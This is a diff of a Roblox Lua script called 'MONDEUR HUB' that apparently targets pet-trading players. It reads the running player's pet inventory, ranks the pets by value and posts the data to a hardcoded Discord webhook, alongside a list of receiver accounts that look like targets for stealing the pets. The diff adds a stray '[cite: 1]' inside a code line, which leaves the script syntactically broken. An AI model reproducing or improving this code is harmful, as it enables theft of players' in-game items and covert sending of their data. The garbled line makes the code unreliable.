@@ -1,4 +1,4 @@
--- [[ MONDEUR HUB | FINAL MAX V7 STABLE ]] --
+-- [[ MONDEUR HUB | FINAL MAX V8 ]] --
 local HttpService       = game:GetService("HttpService")
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,16 +9,18 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWS
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
 
 --------------------------------------------------------------
--- CRASH PROTECTOR: WAIT FOR GAME LOAD
+-- PASSIVE LOADING GUARD (Fixes StreamingHelper Crashes)
 --------------------------------------------------------------
 if not game:IsLoaded() then game.Loaded:Wait() end
+task.wait(5) -- Mandatory delay to let 3D assets load 
+
 local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60)
 local Fsys2 = require(Fsys)
 local load = Fsys2.load
 local InventoryDB = load("InventoryDB")
 
 --------------------------------------------------------------
--- UI DESIGN
+-- MONDEUR UNIQUE UI (Final Version)
 --------------------------------------------------------------
 local function sendMondeurReport(pets, totalVal, totalCount, receiver)
     local request = (syn and syn.request) or http_request or request
@@ -69,17 +71,14 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
 end
 
 --------------------------------------------------------------
--- CORE SCAN LOGIC (Using direct GetInventory for stability)
+-- CORE SCAN LOGIC (Using Remote Invocation)
 --------------------------------------------------------------
 local function execute()
     local success, inv = pcall(function() 
         return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
     end)
     
-    if not success or not inv then 
-        warn("Inventory not accessible yet, retrying...")
-        return 
-    end
+    if not success or not inv then return end
 
     local pets, totalVal, totalCount = {}, 0, 0
     
@@ -87,14 +86,13 @@ local function execute()
         if item.Kind == "Pet" then
             totalCount = totalCount + 1
             local petData = InventoryDB.pets[item.id]
-            -- Value detection from item properties
-            local val = (item.properties and item.properties.value) or 0
+            local val = (item.properties and item.properties.value) or 0 [cite: 1]
             table.insert(pets, {name = (petData and petData.name) or "Unknown", value = val})
             totalVal = totalVal + val
         end
     end
 
-    -- Value-based sorting
+    -- Value-based sorting (Highest to Lowest) 
     table.sort(pets, function(a, b) return a.value > b.value end)
 
     local target = nil
@@ -105,7 +103,7 @@ local function execute()
     sendMondeurReport(pets, totalVal, totalCount, target)
 end
 
--- Execution Loop
+-- Execution
 task.spawn(function()
-    execute() -- Initial run
+    pcall(execute)
 end)
